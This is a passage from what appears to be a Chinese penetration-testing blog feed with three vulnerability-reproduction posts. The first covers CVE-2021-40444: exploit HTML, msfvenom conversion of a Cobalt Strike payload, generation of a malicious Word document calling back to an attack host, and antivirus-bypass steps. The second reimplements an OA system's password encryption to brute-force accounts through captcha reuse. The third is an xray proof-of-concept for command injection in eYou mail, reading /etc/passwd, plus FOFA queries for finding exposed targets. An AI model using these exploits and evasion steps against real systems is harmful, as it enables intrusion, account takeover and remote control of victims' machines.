class="hljs-string">&#x27;CLSID:edbc374c-5730-432a-b5b8-de94f0b57217&#x27;</span>),</span><br><span class="language-javascript">                <span class="hljs-variable language_">window</span>[<span class="hljs-string">&quot;HTMLElement&quot;</span>][<span class="hljs-string">&quot;prototype&quot;</span>][<span class="hljs-string">&quot;appendChild&quot;</span>][<span class="hljs-string">&#x27;call&#x27;</span>](htmlfile5[<span class="hljs-string">&#x27;Script&#x27;</span>][<span class="hljs-string">&#x27;document&#x27;</span>][<span class="hljs-string">&#x27;body&#x27;</span>], htmlScript),</span><br><span class="language-javascript">                 <span class="hljs-comment">// cpl执行列，多个路径队列，总会有一个是天选之人的。</span></span><br><span class="language-javascript">                <span class="hljs-title class_">ActiveXObjectVAR</span>[<span class="hljs-string">&#x27;Script&#x27;</span>][<span class="hljs-string">&#x27;location&#x27;</span>] = <span class="hljs-string">&#x27;.cpl:123&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-title class_">ActiveXObjectVAR</span>[<span class="hljs-string">&#x27;Script&#x27;</span>][<span class="hljs-string">&#x27;location&#x27;</span>] = <span class="hljs-string">&#x27;.cpl:123&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-title class_">ActiveXObjectVAR</span>[<span class="hljs-string">&#x27;Script&#x27;</span>][<span class="hljs-string">&#x27;location&#x27;</span>] = <span class="hljs-string">&#x27;.cpl:123&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-title class_">ActiveXObjectVAR</span>[<span class="hljs-string">&#x27;Script&#x27;</span>][<span class="hljs-string">&#x27;location&#x27;</span>] = <span class="hljs-string">&#x27;.cpl:123&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-title class_">ActiveXObjectVAR</span>[<span class="hljs-string">&#x27;Script&#x27;</span>][<span class="hljs-string">&#x27;location&#x27;</span>] = <span class="hljs-string">&#x27;.cpl:123&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-title class_">ActiveXObjectVAR</span>[<span class="hljs-string">&#x27;Script&#x27;</span>][<span class="hljs-string">&#x27;location&#x27;</span>] = <span class="hljs-string">&#x27;.cpl:123&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-title class_">ActiveXObjectVAR</span>[<span class="hljs-string">&#x27;Script&#x27;</span>][<span class="hljs-string">&#x27;location&#x27;</span>] = <span class="hljs-string">&#x27;.cpl:123&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-title class_">ActiveXObjectVAR</span>[<span class="hljs-string">&#x27;Script&#x27;</span>][<span class="hljs-string">&#x27;location&#x27;</span>] = <span class="hljs-string">&#x27;.cpl:123&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-title class_">ActiveXObjectVAR</span>[<span class="hljs-string">&#x27;Script&#x27;</span>][<span class="hljs-string">&#x27;location&#x27;</span>] = <span class="hljs-string">&#x27;.cpl:123&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-title class_">ActiveXObjectVAR</span>[<span class="hljs-string">&#x27;Script&#x27;</span>][<span class="hljs-string">&#x27;location&#x27;</span>] = <span class="hljs-string">&#x27;.cpl:../../../AppData/Local/Temp/Low/championship.inf&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-title class_">ActiveXObjectVAR2</span>[<span class="hljs-string">&#x27;Script&#x27;</span>][<span class="hljs-string">&#x27;location&#x27;</span>] = <span class="hljs-string">&#x27;.cpl:../../../AppData/Local/Temp/championship.inf&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-title class_">ActiveXObjectVAR3</span>[<span class="hljs-string">&#x27;Script&#x27;</span>][<span class="hljs-string">&#x27;location&#x27;</span>] = <span class="hljs-string">&#x27;.cpl:../../../../AppData/Local/Temp/Low/championship.inf&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-title class_">ActiveXObjectVAR4</span>[<span class="hljs-string">&#x27;Script&#x27;</span>][<span class="hljs-string">&#x27;location&#x27;</span>] = <span class="hljs-string">&#x27;.cpl:../../../../AppData/Local/Temp/championship.inf&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-title class_">ActiveXObjectVAR5</span>[<span class="hljs-string">&#x27;Script&#x27;</span>][<span class="hljs-string">&#x27;location&#x27;</span>] = <span class="hljs-string">&#x27;.cpl:../../../../../Temp/Low/championship.inf&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-title class_">ActiveXObjectVAR4</span>[<span class="hljs-string">&#x27;Script&#x27;</span>][<span class="hljs-string">&#x27;location&#x27;</span>] = <span class="hljs-string">&#x27;.cpl:../../../../../Temp/championship.inf&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-title class_">ActiveXObjectVAR4</span>[<span class="hljs-string">&#x27;Script&#x27;</span>][<span class="hljs-string">&#x27;location&#x27;</span>] = <span class="hljs-string">&#x27;.cpl:../../Low/championship.inf&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-title class_">ActiveXObjectVAR4</span>[<span class="hljs-string">&#x27;Script&#x27;</span>][<span class="hljs-string">&#x27;location&#x27;</span>] = <span class="hljs-string">&#x27;.cpl:../../championship.inf&#x27;</span>;</span><br><span class="language-javascript">            &#125;());</span><br><span class="language-javascript">        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>实例化一个ActiveXObject，调用XMLHttpRequest请求远程的cab,然后IE将其解压到Temp。</p><p>大致流程：</p><blockquote><p>发起远程请求–&gt;mshtml.dll解析–&gt;下载cab文件 --&gt;从IE的TEMP目录找到临时的cab文件解压C:\Users\xxx\AppData\Local\Temp–&gt;control.exe调用inf</p></blockquote><p>目录<code>C:\Users\admin\AppData\Local\Temp</code>生成一个.inf文件（）实际上是执行弹出计算器的dll文件。</p><p><img src="https://s1.ax1x.com/2023/06/24/pCt62DA.png" alt=""></p><p>详见：<a href="https://xret2pwn.github.io/CVE-2021-40444-Analysis-and-Exploit/">https://xret2pwn.github.io/CVE-2021-40444-Analysis-and-Exploit/</a></p><p><strong>ProcessMonitor</strong></p><p>rundll32运行了msword.inf（dll）</p><p><img src="https://s1.ax1x.com/2023/06/24/pCt6Lbn.png" alt=""></p><h3 id="0x04-CS上线">0x04 CS上线</h3><p>CS设置好监听器，然后生成Raw类型32位payload。</p><p><img src="https://s1.ax1x.com/2023/06/24/pCt6gud.png" alt=""></p><p>使用msfvenom把payload转换成dll。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -f dll -o shell.dll<br></code></pre></td></tr></table></figure><p>然后把转换后的dll（shell.dll）复制到PoC目录 test文件夹下，执行exploit.py生成恶意docx文件。当然也可以也不复制，执行exploit.py时指定路径即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 exploit.py generate <span class="hljs-built_in">test</span>/shell.dll http://192.168.176.139<br>udo python3 exploit.py host 80<br></code></pre></td></tr></table></figure><p>office打开docx文件，Bigo！CS上线成功。</p><p><img src="https://s1.ax1x.com/2023/06/24/pCt6fEt.png" alt=""></p><p><img src="https://s1.ax1x.com/2023/06/24/pCt6jU0.png" alt=""></p><h3 id="0x05-Bypass-AV？">0x05 Bypass AV？</h3><p>现在各大杀软更新了指纹库。</p><p><img src="https://s1.ax1x.com/2023/06/24/pCt6Tgg.png" alt=""></p><p>使用 <a href="https://github.com/aslitsecurity/CVE-2021-40444_builders">https://github.com/aslitsecurity/CVE-2021-40444_builders</a> bypass</p><p>1、CS生成原生payload，msf转换成dll；</p><p>2、重命名dll -&gt; IEcache.inf，python generate_cab.py生成cab；</p><p>3、生成html，<code>python generate_html.py http://[attack ip]/winupdate.cab tests.txt</code>;</p><p>4、生成doc，<code> generate_doc.py HTTP:\\[attack ip]\tests.txt</code></p><p>5、cab、tests.txt放到parrpt上，启web服务。</p><p>火绒pass</p><p><img src="https://s1.ax1x.com/2023/06/24/pCt67vQ.png" alt=""></p><p>某数字pass</p><p><img src="https://s1.ax1x.com/2023/06/24/pCt6XEq.png" alt=""></p><p>Defender，GG</p><p><img src="https://s1.ax1x.com/2023/06/24/pCt6qDs.png" alt=""></p><p>Office打开 doc ，Bigo！</p><p><img src="https://s1.ax1x.com/2023/06/24/pCt6buj.png" alt=""></p><p>Reference</p><p><a href="https://xret2pwn.github.io/CVE-2021-40444-Analysis-and-Exploit/">https://xret2pwn.github.io/CVE-2021-40444-Analysis-and-Exploit/</a></p><p><a href="https://github.com/lockedbyte/CVE-2021-40444/">https://github.com/lockedbyte/CVE-2021-40444/</a></p><p><a href="https://github.com/aslitsecurity/CVE-2021-40444_builders">https://github.com/aslitsecurity/CVE-2021-40444_builders</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vuln</tag>
      
      <tag>CVE-2021-40444</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某OA登陆数据包字段加密问题</title>
    <link href="/posts/8fc8f9f9.html"/>
    <url>/posts/8fc8f9f9.html</url>
    
    <content type="html"><![CDATA[<p>在某次测试，遇到一OA页面存在验证码复用，本想可以直接水个洞交差了，但密码字段是加密，没法直接水洞，故做个笔记。</p><h3 id="0x01-INFO">0x01 INFO</h3><p><img src="https://z3.ax1x.com/2021/08/29/hGQt0S.png" alt="上图来自官网测试环境"></p><p>如图，js加密函数调用为：desEncrypt(document.forms[0].newPassWord.value)</p><p><img src="https://z3.ax1x.com/2021/08/29/hGQYm8.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/29/hGQQfA.png" alt="i"></p><p><img src="https://z3.ax1x.com/2021/08/29/hGQQfA.png" alt=""></p><p>而且调用加密函数时，会发起一个ajax请求，同时服务端返回一串js代码。</p><p><img src="https://z3.ax1x.com/2021/08/29/hGQBpn.png" alt=""></p><p>分析发现加密函数：desEncrypt()定义在：[security.js]文件中：</p><p><img src="https://z3.ax1x.com/2021/08/29/hGQ3lt.png" alt=""></p><p>把[security.js]保存，格式化一下。</p><p>Look look发现，该js文件中定义了 aes/des加密调用过程：</p><p>进行加密前，先向 [<a href="https://demo.xxx.com/resource/js/session.jsp">https://demo.xxx.com/resource/js/session.jsp</a>] 发起请求，服务端返回包含当前SessionId的js，并将SessionId作为安全秘钥进行aes/des加密运算。</p><p><img src="https://z3.ax1x.com/2021/08/29/hGQ86P.png" alt=""></p><p>继续look发现，修改密码页面返回的数字有识别度：1为验证错误，2为原密码错误</p><p><img src="https://z3.ax1x.com/2021/08/29/hGQGOf.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/29/hGQr60.png" alt=""></p><h3 id="0x02-刨析">0x02 刨析</h3><p>​服务器后端会先校验验证码是否正确，然后再校验原密码正确性，正确后再进行下一步-修改密码，由于验证可复用（只要前端页面不刷新，验证码就不会失效），因此可以重复发起请求去验证原密码：当返数字非1、非2时则可能是原密码校验成功。</p><p>关于密码字段加密，可通过调用desEncrypt()进行加密。</p><h3 id="0x03-准备">0x03 准备</h3><p>1、<a href="https://phantomjs.org">phantomJS</a>；<br>2、jsEncrypter - jsEncrypter_des.js;<br>3、保存标站点的【 security.js、base64.js、aes.js】；</p><p><img src="https://z3.ax1x.com/2021/08/29/hGQNTg.png" alt=""></p><p>4、拦截登录请求包，Ctrl+R，放掉当前拦截的数据包，重复发送，复制返回内容。</p><p><img src="https://z3.ax1x.com/2021/08/29/hGQakQ.png" alt=""></p><p>5、新建getSessionId()方法，写入返回的 SessionId值（每次变更后都需要修改）：</p><p><img src="https://z3.ax1x.com/2021/08/29/hGQdYj.png" alt=""></p><p>注释引入文件以及ajax请求部分代码，新增内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">str = <span class="hljs-title function_">getSessionId</span>()<br><span class="hljs-keyword">return</span> str<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/08/29/hGQwfs.png" alt=""></p><p>Code：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// filename: security.js</span><br><br><span class="hljs-comment">// Com_RegisterFile(&quot;security.js&quot;);</span><br><span class="hljs-comment">// Com_IncludeFile(&quot;aes.js&quot;);</span><br><span class="hljs-comment">// Com_IncludeFile(&quot;base64.js&quot;);</span><br><br><span class="hljs-keyword">var</span> <span class="hljs-variable constant_">SECURITYKEY</span> = &#123;<br>    <span class="hljs-attr">toHexString</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">str</span>) &#123;<br>        <span class="hljs-keyword">var</span> temp = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; str.<span class="hljs-property">length</span>; i++) &#123;<br>            temp += str.<span class="hljs-title function_">charCodeAt</span>(i).<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>)<br>        &#125;<br>        <span class="hljs-keyword">return</span> temp<br>    &#125;,<br>    <span class="hljs-attr">_2</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-comment">// $.ajax(&#123;</span><br>        <span class="hljs-comment">//     async: false,</span><br>        <span class="hljs-comment">//     dataType: &quot;script&quot;,</span><br>        <span class="hljs-comment">//     url: Com_Parameter.ResPath + &quot;js/session.jsp?_=&quot; + new Date().getTime()</span><br>        <span class="hljs-comment">// &#125;);</span><br>        <span class="hljs-comment">// var str = &quot;&quot;;</span><br><br><br>        <span class="hljs-comment">// if (window.getSessionId) &#123;</span><br>        <span class="hljs-comment">//     str = getSessionId()</span><br>        <span class="hljs-comment">// &#125;</span><br>        str = <span class="hljs-title function_">getSessionId</span>()<br>        <span class="hljs-keyword">return</span> str<br>    &#125;,<br>    <span class="hljs-attr">supportEncodings</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> [<span class="hljs-string">&quot;aes&quot;</span>, <span class="hljs-string">&quot;des&quot;</span>]<br>    &#125;,<br>    <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">encodeType</span>) &#123;<br>        <span class="hljs-keyword">var</span> str = <span class="hljs-variable constant_">SECURITYKEY</span>.<span class="hljs-title function_">_2</span>();<br>        <span class="hljs-keyword">if</span> (encodeType == <span class="hljs-literal">null</span> || encodeType == <span class="hljs-string">&#x27;aes&#x27;</span>) &#123;<br>            <span class="hljs-keyword">if</span> (str.<span class="hljs-property">length</span> &lt; <span class="hljs-number">32</span>) &#123;<br>                str += <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz1234567890&quot;</span><br>            &#125;<br>            str = str.<span class="hljs-title function_">toUpperCase</span>();<br>            <span class="hljs-keyword">var</span> key = &#123;&#125;;<br>            key.<span class="hljs-property">key</span> = str.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>);<br>            key.<span class="hljs-property">iv</span> = str.<span class="hljs-title function_">substring</span>(<span class="hljs-number">16</span>, <span class="hljs-number">32</span>);<br>            key.<span class="hljs-property">security</span> = <span class="hljs-string">&quot;\u4435\u5320\u4d35&quot;</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (str.<span class="hljs-property">length</span> &lt; <span class="hljs-number">16</span>) &#123;<br>                str += <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br>            &#125;<br>            str = str.<span class="hljs-title function_">toUpperCase</span>();<br>            <span class="hljs-keyword">var</span> key = &#123;&#125;;<br>            key.<span class="hljs-property">key</span> = <span class="hljs-variable constant_">SECURITYKEY</span>.<span class="hljs-title function_">toHexString</span>(str.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>));<br>            key.<span class="hljs-property">iv</span> = <span class="hljs-variable constant_">SECURITYKEY</span>.<span class="hljs-title function_">toHexString</span>(str.<span class="hljs-title function_">substring</span>(<span class="hljs-number">8</span>, <span class="hljs-number">16</span>));<br>            key.<span class="hljs-property">security</span> = <span class="hljs-string">&quot;\u4445\u5320\u4d45&quot;</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> key<br>    &#125;,<br>    <span class="hljs-attr">getCookie</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">c_name</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">var</span> cookies = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;;&quot;</span>);<br>            <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; cookies.<span class="hljs-property">length</span>; i++) &#123;<br>                <span class="hljs-keyword">var</span> xc = cookies[i];<br>                <span class="hljs-keyword">var</span> cn = xc.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, xc.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;=&quot;</span>)).<span class="hljs-title function_">toUpperCase</span>();<br>                cn = cn.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^\s*/</span>, <span class="hljs-string">&quot;&quot;</span>).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\s*$/</span>, <span class="hljs-string">&quot;&quot;</span>);<br>                <span class="hljs-keyword">if</span> (cn == c_name) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">unescape</span>(xc.<span class="hljs-title function_">substring</span>(xc.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;=&quot;</span>) + <span class="hljs-number">1</span>, xc.<span class="hljs-property">length</span>))<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>    &#125;<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">base64Convert</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;\u4241\u5345\u3634&#123;&quot;</span> + <span class="hljs-title class_">Base64</span>.<span class="hljs-title function_">encode</span>(<span class="hljs-variable language_">arguments</span>[<span class="hljs-number">0</span>]) + <span class="hljs-string">&quot;&#125;&quot;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">_0</span>(<span class="hljs-params">xForm</span>) &#123;<br>    <span class="hljs-keyword">if</span> (xForm == <span class="hljs-literal">null</span>) &#123;<br>        xForm = <span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-number">0</span>]<br>    &#125;<br>    <span class="hljs-keyword">if</span> (xForm != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (xForm.<span class="hljs-property">encoding</span> == <span class="hljs-string">&quot;multipart/form-data&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">_1</span>(<span class="hljs-params">str, xForm, isX</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">_0</span>(xForm)) &#123;<br>        <span class="hljs-keyword">return</span> str<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">var</span> val = str;<br>        <span class="hljs-keyword">if</span> (str != <span class="hljs-literal">null</span> &amp;&amp; str.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) str = <span class="hljs-title function_">base64Convert</span>(str);<br>        <span class="hljs-keyword">if</span> (val != str) &#123;<br>            <span class="hljs-keyword">if</span> (isX == <span class="hljs-literal">true</span>) &#123;<br>                val = <span class="hljs-string">&quot;\u4645\u5810\u4d40&quot;</span> + str<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                val = <span class="hljs-string">&quot;\u4649\u5820\u4d45&quot;</span> + str<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> val<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">desEncrypt</span>(<span class="hljs-params">value, xForm, type</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">_0</span>(xForm)) &#123;<br>        <span class="hljs-keyword">return</span> value<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">var</span> keyObj = &#123;&#125;;<br>        <span class="hljs-keyword">if</span> (type == <span class="hljs-literal">null</span> || <span class="hljs-string">&quot;aes&quot;</span> == type.<span class="hljs-title function_">toLowerCase</span>()) &#123;<br>            keyObj = <span class="hljs-variable constant_">SECURITYKEY</span>.<span class="hljs-title function_">get</span>();<br>            value = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">AES</span>.<span class="hljs-title function_">encrypt</span>(value, <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Utf8</span>.<span class="hljs-title function_">parse</span>(keyObj.<span class="hljs-property">key</span>), &#123;<br>                <span class="hljs-attr">iv</span>: <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Utf8</span>.<span class="hljs-title function_">parse</span>(keyObj.<span class="hljs-property">iv</span>)<br>            &#125;).<span class="hljs-title function_">toString</span>()<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            keyObj = <span class="hljs-variable constant_">SECURITYKEY</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;des&#x27;</span>);<br>            value = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">DES</span>.<span class="hljs-title function_">encrypt</span>(value, <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Hex</span>.<span class="hljs-title function_">parse</span>(keyObj.<span class="hljs-property">key</span>), &#123;<br>                <span class="hljs-attr">iv</span>: <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Hex</span>.<span class="hljs-title function_">parse</span>(keyObj.<span class="hljs-property">iv</span>)<br>            &#125;)<br>        &#125;<br>        <span class="hljs-keyword">return</span> keyObj.<span class="hljs-property">security</span> + value<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">base64Encode</span>(<span class="hljs-params">str, xForm</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">_1</span>(str, xForm)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">base64Encodex</span>(<span class="hljs-params">str, xForm</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">_1</span>(str, xForm, <span class="hljs-literal">true</span>)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getSessionId</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;53AD650E8542F6E2723515913D104FC2&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>6、burpsuite 加载 jsEncrypter 插件，编辑脚本 jsEncrypter_des.js：</p><p><img src="https://z3.ax1x.com/2021/08/29/hGQDlq.png" alt=""></p><p>运行phantomJS 测试可用性（使用gitbash，避免乱码显示不完整）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">phantomJS jsEncrypter_des.js<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/08/29/hGQWtJ.png" alt=""></p><p>加密后的密码有特殊字符，无法全部直接填充使用，把git bash中输入内容保存为txt，去除【特殊字符】和【==】再导入即可。</p><h3 id="0x04-验证">0x04 验证</h3><!--FOFA：`app="Landray-OA系统"`![](https://z3.ax1x.com/2021/08/29/hGQsXV.png)随机找个目标验证。--><p><img src="https://z3.ax1x.com/2021/08/29/hGQ6mT.png" alt=""></p><p>it’s great！</p><p><img src="https://z3.ax1x.com/2021/08/29/hGQc0U.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vuln</tag>
      
      <tag>OA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>亿邮电子邮件系统RCE</title>
    <link href="/posts/e09aeac0.html"/>
    <url>/posts/e09aeac0.html</url>
    
    <content type="html"><![CDATA[<p>HW漏洞，亿邮电子邮件系统存在远程命令执行漏洞，可执行任意命令。</p><p>验证:</p><p>fofa <code>body=&quot;亿邮电子邮件系统&quot;</code></p><p>​登录页面这样子：</p><p><img src="https://z3.ax1x.com/2021/07/13/WFbJYQ.png" alt=""></p><p>写个xray PoC验证一下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">poc-yaml-eyou-email-rce</span><br><span class="hljs-attr">rules:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">method:</span> <span class="hljs-string">POST</span><br>    <span class="hljs-attr">path:</span> <span class="hljs-string">&quot;/webadm/?q=moni_detail.do&amp;action=gragh&quot;</span><br>    <span class="hljs-attr">headers:</span><br>      <span class="hljs-attr">Content-Type:</span> <span class="hljs-string">application/x-www-form-urlencoded</span><br>    <span class="hljs-attr">follow_redirects:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">body:</span> <span class="hljs-string">|</span><br><span class="hljs-string">      type=&#x27;|cat /etc/passwd||&#x27;</span><br><span class="hljs-string"></span>    <span class="hljs-attr">expression:</span> <span class="hljs-string">|</span><br><span class="hljs-string">      response.status == 200 &amp;&amp; response.body.bcontains(bytes(string(&quot;root&quot;)))</span><br><span class="hljs-string"></span><span class="hljs-attr">detail:</span><br>  <span class="hljs-attr">author:</span> <span class="hljs-string">yiyiyi</span><br>  <span class="hljs-attr">links:</span><br>    <span class="hljs-bullet">-</span> <span 